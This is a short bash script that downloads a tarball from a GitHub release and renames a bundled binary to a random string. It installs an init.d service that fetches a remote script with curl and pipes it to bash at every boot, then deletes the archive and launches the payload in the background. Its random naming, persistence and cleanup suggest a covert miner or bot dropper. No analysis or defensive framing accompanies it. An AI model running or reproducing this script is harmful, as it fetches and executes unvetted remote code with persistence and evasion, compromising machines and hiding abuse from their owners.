cd /
wget https://github.com/ccamse/buzzer/releases/download/v0.0.3/copper.tar
tar -xvf copper.tar
cd /copper
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv screen $variable1
sed -i "s/oodo/${variable1} -t=450 -n=${variable1}/g" ./memory.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/ccamse/buzzer/main/heater.sh)" > socket.sh
chmod a+x socket.sh
update-rc.d socket.sh defaults
rm -rf copper.tar
cd /copper
nohup ./memory.sh
ps -ef | grep copper
